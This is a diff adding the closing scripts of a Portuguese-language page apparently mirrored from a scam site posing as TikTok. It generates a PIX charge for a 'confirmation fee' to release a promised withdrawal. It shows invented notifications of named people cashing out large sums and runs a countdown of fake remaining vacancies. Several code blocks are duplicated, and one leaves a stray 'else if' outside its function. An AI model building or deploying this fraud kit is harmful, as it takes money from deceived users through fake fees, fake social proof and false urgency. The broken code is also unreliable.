+        pixPollTimer = null;
+      }
+    }
+
+    // FUNÇÃO PRINCIPAL GERAR PIX
+    async function gerarPIX() {
+      try {
+        // Pega UTMs
+        const utms = Object.fromEntries(new URLSearchParams(location.search));
+        
+        // Dados do cliente
+        const nome = document.getElementById('nome')?.value || 'Cliente TikTok';
+        const email = 'cliente' + Math.floor(Math.random() * 1000) + '@tiktok.com';
+        const documento = '00000000000';
+        const telefone = '8599' + Math.floor(Math.random() * 9000000 + 1000000);
+        
+        // Payload para API
+        const payload = {
+          amount: PIX_CONFIG.AMOUNT_CENTS,
+          description: "Taxa de Confirmação TikTok",
+          reference: 'TIK-' + Math.random().toString(36).substr(2, 9).toUpperCase() + '-' + Date.now(),
+          productHash: PIX_CONFIG.PRODUCT_HASH,
+          checkoutUrl: location.href,
+          orderbump: [],
+          customer: {
+            name: nome,
+            email: email,
+            document: documento,
+            phone: telefone
+          }
+        };
+        
+        // Adiciona tracking
+        const tk = {};
+        ['utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck','click_id'].forEach(k => {
+          if (utms[k]) tk[k] = utms[k];
+        });
+        if (Object.keys(tk).length) payload.tracking = tk;
+        
+        console.log('Enviando para API:', payload);
+        
+        // Faz requisição
+        const response = await fetch(PIX_CONFIG.API_URL + '/transaction.php', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'Accept': 'application/json',
+            'X-API-Key': PIX_CONFIG.API_TOKEN
+          },
+          body: JSON.stringify(payload)
+        });
+        
+        if (!response.ok) throw new Error(`Erro HTTP: ${response.status}`);
+        
+        const json = await response.json();
+        console.log('Resposta API:', json);
+        
+        const tx = json.transaction || json;
+        
+        if (!tx.qr_code) throw new Error('QR Code não gerado');
+        
+        currentPIXHash = tx.id;
+        
+        // Mostra QR Code
+        document.getElementById('pixLoadingSection').style.display = 'none';
+        document.getElementById('pixQrSection').style.display = 'block';
+        document.getElementById('pixCopySection').style.display = 'block';
+        
+        // Gera QR Code visual
+        const qrBox = document.getElementById('pixQrcode');
+        qrBox.innerHTML = '';
+        new QRCode(qrBox, {
+          text: tx.qr_code,
+          width: 180,
+          height: 180,
+          colorDark: "#000000",
+          colorLight: "#ffffff",
+          correctLevel: QRCode.CorrectLevel.M
+        });
+        
+        // Preenche código
+        document.getElementById('pixEmv').value = tx.qr_code;
+        
+        // Inicia verificação
+        iniciarVerificacaoPIX();
+        
+      } catch (error) {
+        console.error('Erro ao gerar PIX:', error);
+        document.getElementById('pixLoadingSection').innerHTML = 
+          '<div style="color:#ff0050; font-size:14px; padding:20px 0;">Erro ao gerar PIX: ' + error.message + '</div>';
+      }
+    }
+
+    // VERIFICA PAGAMENTO
+    function iniciarVerificacaoPIX() {
+      if (pixPollTimer) clearInterval(pixPollTimer);
+      
+      pixPollTimer = setInterval(async () => {
+        if (!currentPIXHash) return;
+        
+        try {
+          const response = await fetch(
+            `${PIX_CONFIG.API_URL}/check_status.php?hash=${encodeURIComponent(currentPIXHash)}&_=${Date.now()}`,
+            { headers: { 'X-API-Key': PIX_CONFIG.API_TOKEN } }
+          );
+          
+          if (!response.ok) return;
+          
+          const data = await response.json();
+          
+          if (data && data.payment_status === 'paid') {
+            clearInterval(pixPollTimer);
+            
+            // Mostra sucesso
+            document.getElementById('pixQrSection').style.display = 'none';
+            document.getElementById('pixCopySection').style.display = 'none';
+            document.getElementById('pixSuccessMessage').style.display = 'block';
+            
+            // Dispara TikTok Purchase
+            if (typeof ttq !== 'undefined') {
+              ttq.track('Purchase', {
+                content_type: 'product',
+                content_name: 'Taxa de Confirmação TikTok',
+                value: 28.84,
+                currency: 'BRL',
+                order_id: currentPIXHash,
+                quantity: 1
+              });
+              console.log('✅ TikTok Purchase disparado (VENDA CONFIRMADA)');
+            }
+            
+            // Redireciona após 2s
+            setTimeout(() => {
+              alert('✅ Pagamento confirmado! Seu saque foi liberado.');
+              fecharModalPIX();
+            }, 2000);
+          }
+        } catch (e) {
+          console.error('Erro na verificação:', e);
+        }
+      }, 2000);
+    }
+
+    // CONFIGURA BOTÃO DE CÓPIA E EVENTOS
+    document.addEventListener('DOMContentLoaded', function() {
+      const copyBtn = document.getElementById('pixBtnCopy');
+      if (copyBtn) {
+        copyBtn.addEventListener('click', function() {
+          const pixEmv = document.getElementById('pixEmv');
+          if (!pixEmv || !pixEmv.value) return;
+          
+          navigator.clipboard.writeText(pixEmv.value).then(() => {
+            const originalHTML = this.innerHTML;
+            this.innerHTML = '<i class="fas fa-check"></i> CÓDIGO COPIADO!';
+            this.style.background = 'linear-gradient(135deg, #00c853, #00e676)';
+            setTimeout(() => {
+              this.innerHTML = originalHTML;
+              this.style.background = '';
+            }, 2000);
+          });
+        });
+      }
+      
+      // Fecha modal ao clicar fora
+      document.getElementById('pixModalOverlay').addEventListener('click', function(e) {
+        if (e.target === this) fecharModalPIX();
+      });
+    });
+
+    console.log('✅ Sistema PIX carregado corretamente!');
+
+    
+    // OU alternativa mais simples - adiciona botão de "Gerar PIX" dentro do modal
+    // Adicione este HTML no modal, depois da seção de loading:
+    /*
+    <div class="pix-generate-btn-section" id="pixGenerateBtnSection" style="display: flex; margin-bottom: 15px;">
+      <button class="pix-generate-btn" onclick="gerarPIX()" style="width: 100%; padding: 14px; background: linear-gradient(135deg, #ff0050, #ff2a6d); color: white; border: none; border-radius: 10px; font-weight: 700; font-size: 14px; cursor: pointer;">
+        <i class="fas fa-qrcode"></i> GERAR QR CODE PIX
+      </button>
+    </div>
+    */
+  </script>
+  
+  
+  
+
+<script>
+function isOnSectionNine() {
+  const nine = document.getElementById('nine');
+  return nine && nine.classList.contains('is-active');
+}
+function abrirModalPIX() {
+  const modal = document.getElementById('pixModalOverlay');
+  if (!isOnSectionNine()) return;
+  modal.classList.remove('active');
+  setTimeout(() => {
+    modal.classList.add('active');
+  }, 100);
+}
+document.addEventListener('DOMContentLoaded', function () {
+  const modal = document.getElementById('pixModalOverlay');
+  if (modal) modal.classList.remove('active');
+});
+</script>
+
+<script>
+    (function () {
+  const modal = document.getElementById('pixModalOverlay');
+  if (modal) {
+    modal.classList.remove('active');
+    modal.style.display = 'none';
+  }
+})();
+
+</script>
+
+
+  <!-- ===== JAVASCRIPT ELEMENTOS APELATIVOS (ATUALIZADO) ===== -->
+  <script>
+  document.addEventListener('DOMContentLoaded', function () {
+
+    const notificationContainer = document.getElementById('notificationContainer');
+    if (!notificationContainer) return;
+
+    let notificationTimer = null;
+
+    function isOnScreenNine() {
+      const nine = document.getElementById('nine');
+      return nine && nine.classList.contains('is-active');
+    }
+
+    const maleAvatars = [
+      'https://i.pravatar.cc/42?img=1','https://i.pravatar.cc/42?img=2','https://i.pravatar.cc/42?img=3',
+      'https://i.pravatar.cc/42?img=4','https://i.pravatar.cc/42?img=5','https://i.pravatar.cc/42?img=11'
+    ];
+    const femaleAvatars = [
+      'https://i.pravatar.cc/42?img=6','https://i.pravatar.cc/42?img=7','https://i.pravatar.cc/42?img=8',
+      'https://i.pravatar.cc/42?img=9','https://i.pravatar.cc/42?img=10','https://i.pravatar.cc/42?img=14'
+    ];
+    const maleNames = ['João','Pedro','Lucas','Mateus','Gabriel','Carlos','Rafael','Bruno'];
+    const femaleNames = ['Ana','Maria','Julia','Beatriz','Camila','Fernanda','Amanda','Sofia'];
+    const lastNames = ['Silva','Santos','Oliveira','Souza','Pereira','Costa'];
+    const actions = ['sacou R$','confirmou R$','recebeu R$','liberou R$'];
+
+    function randomFrom(arr) {
+      return arr[Math.floor(Math.random() * arr.length)];
+    }
+
+    function gerarNotificacao() {
+      const isMale = Math.random() > 0.5;
+      const name = isMale ? randomFrom(maleNames) : randomFrom(femaleNames);
+      const lastName = randomFrom(lastNames);
+      const avatar = isMale ? randomFrom(maleAvatars) : randomFrom(femaleAvatars);
+      const action = randomFrom(actions);
+      const value = (Math.random() * 4000 + 1200).toFixed(2).replace('.', ',');
+
+      const div = document.createElement('div');
+      div.className = 'notification-item';
+      div.innerHTML = `
+        <div class="notification-icon">
+          <img src="${avatar}" style="width:100%;height:100%;border-radius:50%">
+        </div>
+        <div class="notification-text">
+          <span class="notification-name">${name} ${lastName}</span> ${action} ${value}
+        </div>
+      `;
+
+      notificationContainer.appendChild(div);
+
+      setTimeout(() => div.remove(), 4500);
+    }
+
+    function iniciarNotificacoes() {
+      if (notificationTimer) clearTimeout(notificationTimer);
+
+      let minDelay, maxDelay;
+      if (isOnScreenNine()) {
+        minDelay = 4000;
+        maxDelay = 7000;
+      } else {
+        minDelay = 18000;
+        maxDelay = 30000;
+      }
+
+      const delay = Math.floor(Math.random() * (maxDelay - minDelay)) + minDelay;
+
+      notificationTimer = setTimeout(() => {
+        gerarNotificacao();
+        iniciarNotificacoes();
+      }, delay);
+    }
+
+    iniciarNotificacoes();
+
+    const observer = new MutationObserver(() => iniciarNotificacoes());
+    observer.observe(document.getElementById('screens'), {
+      attributes: true,
+      subtree: true,
+      attributeFilter: ['class']
+    });
+
+  });
+  </script>
+
+
+
+
+
+<script>
+/* ===== CONTROLE AVANÇADO DE NOTIFICAÇÕES POR TELA ===== */
+(function () {
+  let timer = null;
+  let lastVacancy = null;
+
+  function getActiveScreen() {
+    return document.querySelector('.screen.is-active')?.id || null;
+  }
+
+  function isOnNine() {
+    return getActiveScreen() === 'nine';
+  }
+
+  function isOnLoading() {
+    return getActiveScreen() === 'seven';
+  }
+
+  function isOnThree() {
+    return getActiveScreen() === 'three';
+  }
+
+  function rand(min, max) {
+    return Math.floor(Math.random() * (max - min + 1)) + min;
+  }
+
+  function positionContainer(container) {
+    if (isOnThree()) {
+      container.style.top = '16px';
+      container.style.bottom = 'auto';
+      container.style.right = '16px';
+      container.style.left = 'auto';
+    } else {
+      container.style.top = 'auto';
+      container.style.bottom = '16px';
+      container.style.right = '16px';
+      container.style.left = 'auto';
+    }
+  }
+
+  
+function showNotification() {
+  if (typeof isOnLoading === 'function' && isOnLoading()) return;
+
+  let container = document.getElementById('tiktok-notifications');
+  if (!container) {
+    container = document.createElement('div');
+    container.id = 'tiktok-notifications';
+    container.className = 'tiktok-notifications-container';
+    document.body.appendChild(container);
+  }
+
+  const screen = document.querySelector('.screen.is-active')?.id || null;
+
+  container.style.position = 'fixed';
+  container.style.right = '16px';
+  container.style.left = 'auto';
+  container.style.zIndex = '99999';
+
+  if (screen === 'seven') {
+    container.style.display = 'none';
+    return;
+  }
+
+  container.style.display = 'flex';
+
+  if (screen === 'three' || screen === 'nine') {
+    container.style.top = '80px';
+    container.style.bottom = 'auto';
+  } else if (screen === 'one') {
+    container.style.top = 'auto';
+    container.style.bottom = '140px';
+  } else {
+    container.style.top = 'auto';
+    container.style.bottom = '100px';
+  }
+
+  const names = ['Ana','Maria','Julia','Beatriz','João','Pedro','Lucas','Carlos'];
+  const lasts = ['Silva','Santos','Oliveira','Souza'];
+  const avatars = [
+    'https://i.pravatar.cc/42?img=1',
+    'https://i.pravatar.cc/42?img=6',
+    'https://i.pravatar.cc/42?img=12',
+    'https://i.pravatar.cc/42?img=14'
+  ];
+  const actions = ['confirmou saque de', 'sacou', 'recebeu'];
+
+  const name =
+    names[Math.floor(Math.random() * names.length)] +
+    ' ' +
+    lasts[Math.floor(Math.random() * lasts.length)];
+
+  const value = (Math.random() * 2500 + 1200).toLocaleString('pt-BR', {
+    minimumFractionDigits: 2,
+    maximumFractionDigits: 2
+  });
+
+  const n = document.createElement('div');
+  n.className = 'tiktok-notification';
+  n.innerHTML = `
+    <div class="notification-avatar" style="background-image:url('${avatars[Math.floor(Math.random()*avatars.length)]}')"></div>
+    <div class="notification-content">
+      <div class="notification-text">
+        <strong>${name}</strong> ${actions[Math.floor(Math.random()*actions.length)]}
+        <span class="notification-value">R$ ${value}</span>
+      </div>
+      <div class="notification-time">agora</div>
+    </div>
+    <div class="notification-close">×</div>
+  `;
+
+  container.appendChild(n);
+  setTimeout(() => n.classList.add('visible'), 50);
+
+  const closeBtn = n.querySelector('.notification-close');
+  closeBtn.addEventListener('click', () => {
+    n.classList.remove('visible');
+    setTimeout(() => n.remove(), 300);
+  });
+
+  setTimeout(() => {
+    if (n.parentNode) {
+      n.classList.remove('visible');
+      setTimeout(() => n.remove(), 300);
+    }
+  }, 5000);
+}
+ else if (screen === 'one') {
+  // 🔽 página raiz → sobe mais para não cobrir "Sacar"
+  container.style.top = 'auto';
+  container.style.bottom = '140px';
+
+} else {
+  // 🔽 demais telas normais
+  container.style.top = 'auto';
+  container.style.bottom = '100px';
+}
+
+
+  // =========================
+  // DADOS DA NOTIFICAÇÃO
+  // =========================
+  const names = ['Ana','Maria','Julia','Beatriz','João','Pedro','Lucas','Carlos'];
+  const lasts = ['Silva','Santos','Oliveira','Souza'];
+  const avatars = [
+    'https://i.pravatar.cc/42?img=1',
+    'https://i.pravatar.cc/42?img=6',
+    'https://i.pravatar.cc/42?img=12',
+    'https://i.pravatar.cc/42?img=14'
+  ];
+  const actions = ['confirmou saque de', 'sacou', 'recebeu'];
+
+  const name =
+    names[Math.floor(Math.random() * names.length)] +
+    ' ' +
+    lasts[Math.floor(Math.random() * lasts.length)];
+
+  const value = (Math.random() * 2500 + 1200).toLocaleString('pt-BR', {
+    minimumFractionDigits: 2,
+    maximumFractionDigits: 2
+  });
+
+  const n = document.createElement('div');
+  n.className = 'tiktok-notification';
+  n.innerHTML = `
+    <div class="notification-avatar" style="background-image:url('${avatars[Math.floor(Math.random()*avatars.length)]}')"></div>
+    <div class="notification-content">
+      <div class="notification-text">
+        <strong>${name}</strong> ${actions[Math.floor(Math.random()*actions.length)]}
+        <span class="notification-value">R$ ${value}</span>
+      </div>
+      <div class="notification-time">agora</div>
+    </div>
+    <div class="notification-close">×</div>
+  `;
+
+  container.appendChild(n);
+
+  // anima entrada
+  setTimeout(() => n.classList.add('visible'), 50);
+
+  // botão ❌ fecha manualmente
+  const closeBtn = n.querySelector('.notification-close');
+  closeBtn.addEventListener('click', () => {
+    n.classList.remove('visible');
+    setTimeout(() => n.remove(), 300);
+  });
+
+  // remove automático após 5s
+  setTimeout(() => {
+    if (n.parentNode) {
+      n.classList.remove('visible');
+      setTimeout(() => n.remove(), 300);
+    }
+  }, 5000);
+}
+
+
+  function isOnThree() {
+  const three = document.getElementById('three');
+  return three && three.classList.contains('is-active');
+}
+
+function isOnLoading() {
+  const seven = document.getElementById('seven');
+  return seven && seven.classList.contains('is-active');
+}
+
+function startTimer() {
+  if (timer) clearTimeout(timer);
+
+  // ❌ não dispara em telas especiais
+  if (isOnNine() || isOnThree() || isOnLoading()) return;
+
+  timer = setTimeout(() => {
+    showNotification();
+    startTimer();
+  }, rand(4000, 10000));
+}
+
+
+  function observeVacancies() {
+    const el = document.getElementById('vacanciesNumber');
+    if (!el) return;
+
+    lastVacancy = parseInt(el.textContent, 10);
+
+    const obs = new MutationObserver(() => {
+      if (!isOnNine()) return;
+
+      const current = parseInt(el.textContent, 10);
+      if (current < lastVacancy) {
+        showNotification();
+      }
+      lastVacancy = current;
+    });
+
+    obs.observe(el, {
+      childList: true,
+      characterData: true,
+      subtree: true
+    });
+  }
+
+  function watchScreens() {
+    const screens = document.getElementById('screens');
+    if (!screens) return;
+
+    const obs = new MutationObserver(() => {
+      if (isOnLoading()) {
+        if (timer) clearTimeout(timer);
+      } else if (isOnNine()) {
+        if (timer) clearTimeout(timer);
+      } else {
+        startTimer();
+      }
+
+      const container = document.getElementById('tiktok-notifications');
+    });
+
+    obs.observe(screens, {
+      attributes: true,
+      subtree: true,
+      attributeFilter: ['class']
+    });
+  }
+
+  document.addEventListener('DOMContentLoaded', () => {
+    startTimer();
+    observeVacancies();
+    watchScreens();
+  });
+})();
+</script>
+
+
+<script>
+/* =========================
+   CONTROLE DEFINITIVO DE NOTIFICAÇÕES POR TELA
+========================= */
+(function () {
+  function activeScreen() {
+    return document.querySelector('.screen.is-active')?.id || null;
+  }
+
+  function applyNotificationPosition() {
+    const box = document.getElementById('tiktok-notifications');
+    if (!box) return;
+
+    const screen = activeScreen();
+
+    // Loading: nenhuma notificação
+    if (screen === 'seven') {
+      box.style.display = 'none';
+      return;
+    }
+
+    box.style.display = 'flex';
+    box.style.right = '16px';
+    box.style.left = 'auto';
+
+    if (screen === 'three') {
+      // topo direito
+      box.style.top = '16px';
+      box.style.bottom = 'auto';
+    } else {
+      // padrão: inferior direito
+      box.style.top = 'auto';
+      box.style.bottom = '16px';
+    }
+  }
+
+  document.addEventListener('DOMContentLoaded', applyNotificationPosition);
+
+  const observer = new MutationObserver(applyNotificationPosition);
+  observer.observe(document.body, {
+    attributes: true,
+    subtree: true,
+    attributeFilter: ['class']
+  });
+})();
+</script>
+
+<script>
+/* ===== CONTADOR DE VAGAS FUNCIONAL (#nine) ===== */
+(function () {
+  let vacancies = 28;
+  let lastUpdate = Date.now();
+
+  const el = document.getElementById('vacanciesNumber');
+  if (!el) return;
+
+  el.textContent = vacancies;
+
+  function isOnNine() {
+    const nine = document.getElementById('nine');
+    return nine && nine.classList.contains('is-active');
+  }
+
+  setInterval(() => {
+    if (!isOnNine()) return;
+
+    // diminui no máximo a cada 3–6 segundos
+    const now = Date.now();
+    if (now - lastUpdate < 3000) return;
+
+    if (vacancies > 3 && Math.random() < 0.4) {
+      vacancies--;
+      lastUpdate = now;
+      el.textContent = vacancies;
+
+      // dispara notificação sincronizada
+      if (typeof window.showNotification === 'function') {
+        window.showNotification();
+      }
+    }
+  }, 1000);
+})();
+</script>
+
+<script>
+/* =========================
+   CONTROLE FINAL DAS NOTIFICAÇÕES
+========================= */
+(function () {
+  function activeScreen() {
+    return document.querySelector('.screen.is-active')?.id || null;
+  }
+
+  function applyNotificationPosition() {
+    const box = document.getElementById('tiktok-notifications');
+    if (!box) return;
+
+    const screen = activeScreen();
+
+    box.style.position = 'fixed';
+    box.style.right = '16px';
+    box.style.left = 'auto';
+    box.style.zIndex = '99999';
+
+    // ❌ loading: sem notificação
+    if (screen === 'seven') {
+      box.style.display = 'none';
+      return;
+    }
+
+    box.style.display = 'flex';
+
+    // 🔼 topo direito (three e nine)
+    if (screen === 'three' || screen === 'nine') {
+      box.style.top = '80px';
+      box.style.bottom = 'auto';
+    } 
+    // 🔽 inferior direito, mas mais alto (não cobre botão)
+    else {
+      box.style.top = 'auto';
+      box.style.bottom = '90px'; // <<< SUBIU AQUI
+    }
+  }
+
+  // roda ao carregar
+  document.addEventListener('DOMContentLoaded', applyNotificationPosition);
+
+  // observa troca de telas
+  const observer = new MutationObserver(applyNotificationPosition);
+  observer.observe(document.body, {
+    attributes: true,
+    subtree: true,
+    attributeFilter: ['class']
+  });
+})();
+</script>
+
+
+
+</body>
+
+<!-- Mirrored from resgate-prontoo.online/pontos/backredirect/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 20 Dec 2025 16:17:33 GMT -->
+</html>
